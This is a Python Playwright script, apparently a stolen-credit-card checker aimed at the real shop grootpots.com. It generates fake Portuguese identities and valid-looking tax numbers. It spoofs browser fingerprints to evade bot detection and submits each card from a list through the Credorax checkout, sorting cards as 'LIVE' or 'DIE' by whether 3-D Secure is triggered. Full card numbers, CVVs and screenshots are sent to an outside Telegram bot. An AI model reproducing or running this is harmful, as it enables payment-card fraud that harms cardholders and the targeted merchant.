import os
import time
import random
import string
import sys
import requests
from playwright.sync_api import sync_playwright

# ===== TELEGRAM (via variáveis de ambiente) =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def enviar_telegram_msg(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        print("  ⚠️ TELEGRAM_TOKEN/CHAT_ID não configurados.")
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"},
            timeout=15,
        )
    except Exception as e:
        print(f"  ⚠️ Erro Telegram msg: {e}")

def enviar_telegram_foto(page, legenda):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        caminho_foto = f"passo_{int(time.time())}.png"
        page.screenshot(path=caminho_foto, full_page=True)
        with open(caminho_foto, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": legenda, "parse_mode": "HTML"},
                files={"photo": f},
                timeout=30,
            )
        print(f"  📸 Print: {legenda}")
        try:
            os.remove(caminho_foto)
        except Exception:
            pass
    except Exception as e:
        print(f"  ⚠️ Erro print: {e}")

def gerar_dados_unicos():
    nomes = ["João", "Miguel", "Pedro", "Tiago", "André", "Rui", "Beatriz", "Inês", "Mariana", "Carolina"]
    sobrenomes = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira", "Costa", "Rodrigues", "Martins", "Sousa"]
    nome = random.choice(nomes)
    sobrenome = random.choice(sobrenomes)
    sufixo = ''.join(random.choices(string.digits, k=4))
    email = f"{nome.lower()}.{sobrenome.lower()}{sufixo}@gmail.com"
    telefone = f"9{random.randint(10000000, 99999999)}"
    rua = f"Rua {random.choice(['das Flores', 'Augusta', 'da Liberdade'])}, {random.randint(1, 300)}"
    cep = random.choice(["4000-001", "1000-001", "1100-148", "4540-160", "5000-033"])
    cidade = random.choice(["Porto", "Lisboa", "Braga", "Aveiro", "Belém"])

    nif_base = [random.randint(1, 9) for _ in range(8)]
    soma = sum((nif_base[i] * (9 - i)) for i in range(8))
    digito = 11 - (soma % 11)
    if digito >= 10:
        digito = 0
    nif = ''.join(map(str, nif_base)) + str(digito)

    return nome.capitalize(), sobrenome.capitalize(), rua, cidade, cep, telefone, email, nif

def aplicar_stealth(page):
    page.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        Object.defineProperty(navigator, 'languages', { get: () => ['pt-PT', 'pt', 'en-US', 'en'] });
        window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
    """)

def processar_fluxo(page, cartao_str, index):
    tempo_inicio = time.time()

    try:
        numero, mes, ano, cvv = [p.strip() for p in cartao_str.split('|')]
        if len(ano) == 4:
            ano = ano[-2:]
        validade = f"{mes}/{ano}"
    except Exception:
        return "ERRO", 0

    nome, sobrenome, rua, cidade, cep, telefone, email, nif = gerar_dados_unicos()

    is_live = False
    def monitorar_rede(request):
        nonlocal is_live
        url_req = request.url.lower()
        if ("x3d-redirect" in url_req or "secureacs" in url_req
                or "emv3ds" in url_req or "sicredi" in url_req):
            is_live = True

    page.on("request", monitorar_rede)

    try:
        # ================= PASSO 1: PRODUTO E CARRINHO =================
        print("  -> Acessando produto...")
        page.goto("https://grootpots.com/en/product/stand-farm-duo-2/", wait_until="domcontentloaded")

        print("  -> Aguardando scripts carregarem...")
        page.wait_for_load_state("networkidle", timeout=15000)
        page.wait_for_timeout(3000)

        try:
            btn_cookies = page.locator("button:has-text('Aceitar'), button:has-text('Accept'), button:has-text('Aceito')").first
            if btn_cookies.is_visible(timeout=2000):
                btn_cookies.click()
                page.wait_for_timeout(1000)
        except Exception:
            pass

        print("  -> Selecionando cor Verde (forçado)...")
        page.evaluate("""
            var swatches = document.querySelectorAll('.cfvsw-swatch-inner, .cfvsw-swatch-inner-inner');
            for (var i = 0; i < swatches.length; i++) {
                if (swatches[i].innerText.trim().toLowerCase() === 'verde') {
                    swatches[i].click();
                    break;
                }
            }
        """)
        page.wait_for_timeout(3000)

        print("  -> Adicionando ao carrinho (forçado)...")
        try:
            page.evaluate("""
                var btn = document.querySelector('button[name="add-to-cart"]');
                if (btn) { btn.disabled = false; btn.click(); }
            """)
        except Exception:
            page.locator("button[name='add-to-cart']").first.click()

        page.wait_for_timeout(5000)
        enviar_telegram_foto(page, "🛒 <b>Passo 1: Produto Adicionado</b>")

        print("  -> Indo para o checkout...")
        page.goto("https://grootpots.com/en/step/checkout-2/", wait_until="domcontentloaded")
        page.wait_for_timeout(5000)

        # ================= PASSO 2: CHECKOUT =================
        print("  -> Preenchendo dados...")
        try:
            page.locator("#billing_email").fill(email)
            page.locator("#billing_first_name").fill(nome)
            page.locator("#billing_last_name").fill(sobrenome)
            page.locator("#billing_address_1").fill(rua)
            page.locator("#billing_postcode").fill(cep)
            page.locator("#billing_city").fill(cidade)

            try:
                page.locator("#billing_phone").fill(telefone)
            except Exception:
                pass
            try:
                page.locator("#billing_nif").fill(nif)
            except Exception:
                pass

            page.wait_for_timeout(2000)
        except Exception as e:
            print(f"     ⚠️ Erro ao preencher dados: {e}")
            enviar_telegram_foto(page, "❌ <b>Erro no Checkout</b>")
            return "ERRO", round(time.time() - tempo_inicio, 2)

        print("  -> Selecionando Cartão de Crédito...")
        try:
            page.locator("#payment_method_creditcard_ifthen_for_woocommerce").check(force=True)
            page.wait_for_timeout(1000)
        except Exception:
            pass

        try:
            page.locator("#terms").check(force=True)
            page.wait_for_timeout(1000)
        except Exception:
            pass

        enviar_telegram_foto(page, f"📝 <b>Passo 2: Checkout Preenchido</b>\nCartão: <code>{cartao_str}</code>")

        print("  -> Clicando em 'Pagar agora'...")
        try:
            page.locator("#place_order").click()
        except Exception:
            page.evaluate("document.getElementById('place_order').click()")

        page.wait_for_timeout(8000)

        # ================= PASSO 3: CREDORAX =================
        if ("credorax" in page.url.lower() or "shift4" in page.url.lower()
                or "ifthenpay" in page.url.lower()):
            print("  ✅ Página do Credorax detetada. Preenchendo cartão...")

            page.wait_for_selector("#autocomplete-id-cc-number", timeout=15000)

            def digitar(seletor, texto):
                el = page.locator(seletor)
                el.click()
                el.fill("")
                page.wait_for_timeout(200)
                page.keyboard.type(texto, delay=100)
                page.wait_for_timeout(300)
                el.evaluate("node => node.blur()")
                page.wait_for_timeout(300)

            digitar("#autocomplete-id-cc-number", numero)
            digitar("#autocomplete-id-cc-expiry", validade)
            digitar("input[placeholder='123']", cvv)
            digitar("#autocomplete-id-cc-name", f"{nome} {sobrenome}".upper())

            page.wait_for_timeout(2000)
            enviar_telegram_foto(page, f"💳 <b>Passo 3: Cartão no Credorax</b>\nCartão: <code>{cartao_str}</code>")

            print("  -> Clicando em PAGAR...")
            try:
                with page.expect_navigation(timeout=8000):
                    page.locator(".pay-label-container").click(timeout=5000)
            except Exception:
                if not is_live and "credorax" in page.url.lower():
                    try:
                        page.evaluate(
                            "var btn = document.querySelector('.pay-label-container').closest('button'); "
                            "if(btn) { btn.disabled = false; btn.click(); }"
                        )
                    except Exception:
                        pass

            for _ in range(40):
                time.sleep(0.5)
                if is_live:
                    return "LIVE", round(time.time() - tempo_inicio, 2)
                try:
                    url_atual = page.url.lower()
                    if "carrinho" in url_atual or "finalizar" in url_atual or "checkout" in url_atual:
                        return "DIE", round(time.time() - tempo_inicio, 2)
                    if "credorax" in url_atual:
                        conteudo = page.content().lower()
                        if ("recusado" in conteudo or "declined" in conteudo
                                or "not authorized" in conteudo):
                            return "DIE", round(time.time() - tempo_inicio, 2)
                except Exception:
                    pass

            return "DIE", round(time.time() - tempo_inicio, 2)
        else:
            print("  ❌ O site não redirecionou para o Credorax.")
            enviar_telegram_foto(page, "❌ <b>Falha no Redirecionamento</b>")
            return "ERRO", round(time.time() - tempo_inicio, 2)

    except Exception as e:
        print(f"  ⚠️ Erro técnico: {e}")
        return "ERRO", round(time.time() - tempo_inicio, 2)

def testar(cartoes):
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--disable-blink-features=AutomationControlled']
        )
        user_agent = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        )

        for index, cartao_str in enumerate(cartoes, start=1):
            print(f"\n{'='*50}\nTESTE {index}: {cartao_str}\n{'='*50}")

            context = browser.new_context(
                user_agent=user_agent,
                locale="pt-PT",
                timezone_id="Europe/Lisbon",
                viewport={'width': 1920, 'height': 1080}
            )
            context.clear_cookies()
            page = context.new_page()
            aplicar_stealth(page)

            resultado, tempo = processar_fluxo(page, cartao_str, index)
            print(f"  ⏱️ Tempo do teste: {tempo} segundos")

            if resultado == "LIVE":
                print("  🟢 LIVE 3DS DETECTADO!")
                enviar_telegram_msg(
                    f"🟢 <b>LIVE 3DS (Grootpots)</b>\n"
                    f"💳 <b>Cartão:</b> <code>{cartao_str}</code>\n"
                    f"⏱️ <b>Tempo:</b> {tempo}s"
                )
            elif resultado == "DIE":
                print("  🔴 DIE: Cartão recusado.")
            else:
                print("  ⚠️ ERRO: Verifique os prints no Telegram.")

            context.close()

        browser.close()

if __name__ == "__main__":
    cartoes = []

    if os.path.exists("cartoes.txt"):
        with open("cartoes.txt", encoding="utf-8") as f:
            cartoes = [l.strip() for l in f if l.strip()]

    if not cartoes and os.getenv("CARTOES"):
        cartoes = [c.strip() for c in os.getenv("CARTOES").split(",") if c.strip()]

    if not cartoes:
        print("❌ Nenhum cartão encontrado. Crie cartoes.txt ou defina a variável CARTOES.")
        sys.exit(1)

    print(f"🚀 Iniciando testes na Grootpots com {len(cartoes)} cartões.")
    testar(cartoes)
